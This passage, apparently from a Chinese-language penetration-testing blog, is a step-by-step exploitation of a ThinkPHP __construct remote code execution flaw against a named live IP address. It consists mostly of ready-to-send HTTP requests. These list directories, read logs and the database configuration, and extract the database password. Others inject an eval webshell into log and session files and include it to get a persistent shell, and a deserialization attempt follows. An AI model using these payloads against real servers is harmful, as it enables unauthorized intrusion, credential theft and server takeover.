+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+
+_method=__construct&amp;filter[]=scandir&amp;&amp;filter[]=var_dump&amp;method=GET&amp;get[]=./</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271434575.png" alt="遍历目录查找日志文件位置"><br>我们格式化一下查看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271437009.png" alt="格式化查看"><br>熟悉thinkphp框架的都知道我们的日志文件一般在runtime目录下面我们以此遍历日志位置是.&#x2F;runtime&#x2F;log&#x2F;202406&#x2F;15.log<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271439294.png" alt="日志文件位置"><br>我们看一下日志文件里面的内容</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+
+_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271443131.png" alt="查看日志文件内容"><br>当然我们也可以读取数据库文件</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+
+_method=__construct&amp;filter[]=highlight_file&amp;method=GET&amp;get[]=./application/database.php</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271446843.png" alt="查看数据库文件内容"><br>当然我们可以用另外一种方式读取数据库,查看数据密码</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token punctuation">.</span>password  HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271448665.png" alt="查看数据库用户名"><br>我们回归正题既然我们已经拿到了日志路径是不是想起了thinkphp包含getshell对就是他。测试是否正常包含</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-1&amp;get[]=./runtime/log/202406/15.log</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271451027.png" alt="测试是否正常包含文件"><br>报错记录日志</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+
+_method=__construct&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>ssssss</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271454125.png" alt="报错记录日志"><br>我们下载日志看看是否记录。下载查看日志看看。如果下载的日志没有那么多报错几次他就有了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271456461.png" alt="记录了我们的恶意文件"><br>接下来我们包含一波。</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log
+</span></code></pre>
+<p>写一句话</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 517
+
+_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log&amp;X=phpinfo();</span></code></pre>
+<p>由于我的一句exp 是免杀的所以我就这里打一波马赛克吧。我们看到执行了123456789 。所以证明已经执行我们写一句话的代码。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271501432.png" alt="直接写一句话"><br>runtime log 目录下生成一句话木马<br><a target="_blank" rel="noopener" href="http://103.106.188.58/runtime/log/202406/xxx.php">http://103.106.188.58/runtime/log/202406/xxx.php</a>   这里生成的木马可以修改防止没有访问权限到导致无法放到修改X&#x3D;修改这里的路径<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271505273.png" alt="访问我们的shell"><br>日志这个东西不太稳定另外有点麻烦。我们能不能使用别的方式进行。答案是可以的我们使用session来搞他以linux为例子。如果windows的话等遇到的时候实战搞一波在更新记录一下。</p>
+<h2 id="三-session方式打"><a href="#三-session方式打" class="headerlink" title="三:session方式打"></a>三:session方式打</h2><p>创建session。linux为例子:</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=sessiontest; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+
+_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>&amp;server[]=1</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271508586.png" alt="生成session"><br>包含session</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=sessiontest; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 526
+
+_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=/tmp/sess_sessiontest&amp;X=phpinfo();</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271512019.png" alt="同上写shell"><br>访问一下shell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271516089.png" alt="访问一下shell"><br>上面不管是日志还是session只要知道位置就可以直接打。另外这些太麻烦了我们能不能用别的打可以我们使用反序列化的打一下看看</p>
+<h2 id="四-反序列化打法"><a href="#四-反序列化打法" class="headerlink" title="四:反序列化打法"></a>四:反序列化打法</h2><p>下图是没打成功</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> xxxx
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=sessiontest; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1880
+
+_method=__construct&amp;method=get&amp;filter=unserialize&amp;get[]=反序列化payload</span></code></pre>
